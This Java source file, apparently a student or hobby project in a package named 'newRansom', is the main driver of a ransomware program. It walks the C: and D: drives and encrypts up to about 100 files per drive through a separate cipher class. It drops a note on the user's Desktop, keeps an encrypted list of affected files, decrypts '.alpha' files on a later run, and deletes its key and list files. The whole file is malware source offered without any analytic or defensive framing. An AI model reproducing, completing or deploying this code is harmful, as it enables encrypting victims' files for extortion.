package newRansom;

import java.awt.Desktop;
import java.io.File;
import java.util.ArrayList;
import java.util.Map;

import java.net.URL;
import java.net.URLClassLoader;

import newRansom.CipInterface;
import newRansom.Cip;


public class Main {
	static CipInterface cip = new Cip();
	static FileSearch fs = new FileSearch();
	static boolean isencrypt=true;
	static Map<String, String> list;
	
	public static void main(String[] args) throws Exception {
		String desktoppass = System.getProperty("user.home")+File.separator+"Desktop"+File.separator;

		cip.CreateKey();
		
		File[] roots = File.listRoots();
		
		if(cip.CreateReadFile(desktoppass, "read.txt")) {
			for(int i = 0; i < roots.length; i++)
        	{
			 	if(roots[i].getPath().equals("C:"+File.separator)
					|| roots[i].getPath().equals("D:"+File.separator))
//				if(roots[i].getPath().equals("C:"+File.separator))
			 	{
				 	fs.setDefaultDirectory(roots[i].getPath());
				 	boolean temp = EncryptAllFile(100); 
				 
				 	if(!temp) isencrypt = temp;
			 	}
			 
//			 	System.out.println(i +" : "+ roots[i].getPath());
        	}
//			System.out.println(desktoppass); 

			
			list =  cip.ReturnList();
		
		
			if(!list.isEmpty()) 
			{
				cip.CreateListFile(desktoppass);
				cip.ListEncrypt(desktoppass, "list");
			}
		
			if(isencrypt)
			{
				System.out.println("암호화 complete!!!!!!!!");
		
			}
		
		}
		else {
			for(int i = 0; i < roots.length; i++)
        	{
			 	if(roots[i].getPath().equals("C:"+File.separator)
					|| roots[i].getPath().equals("D:"+File.separator))
//				if(roots[i].getPath().equals("C:"+File.separator))
			 	{
			 		cip.ListDecryte(desktoppass, "list.alpha");
			 		cip.ReadListFile(desktoppass);
				 	fs.setDefaultDirectory(roots[i].getPath());
				 	boolean temp = DencryptAllFile();
				 
//				 	if(!temp) isencrypt = temp;
			 	}
			 
//			 	System.out.println(i +" : "+ roots[i].getPath());
        	}
			
			
			
			}
		
		File f = new File(desktoppass+"read.txt");
		File fl = new File(desktoppass+"list");
		File f2 = new File(desktoppass+"EprivateKey.txt");
		f.delete();
		fl.delete();
		f2.delete();
		
		
	}
	
	public static boolean EncryptAllFile(int n) { 
		int count = 0;
		try {
		ArrayList<File> list = fs.allFileSearch();
//		System.out.print("리스트 :"+list);
		for (int i = 0; i < list.size(); i++) {
			cip.FileEncrypt(list.get(i).getParent() + "\\", list.get(i).getName()); //현재 파일을 보낸다.
			count++;
			if(count > n) return true;
		}
//		System.out.print("리스트 :"+list);
		return true;
		}
		catch(Exception e) 
		{
			return false;
		}
		
	}
	
	public static boolean DencryptAllFile() {
		try {
			ArrayList<File> list = fs.alphaFileSearch();
			System.out.print("리스트 :"+list);
			for (int i = 0; i < list.size(); i++) {
				System.out.println(list.get(i).getParent());
				System.out.println(list.get(i).getName());
				if(list.get(i).getName().substring((list.get(i).getName().length()-5)).equals("alpha"))
				{
//				//	System.out.println(list.get(i).getName()+"복호화");
					cip.FileDecryte(list.get(i).getParent() + "\\", list.get(i).getName());
				}
			
			}
		return true;
		}
		catch(Exception e) 
		{
			return false;
		}
	}
}
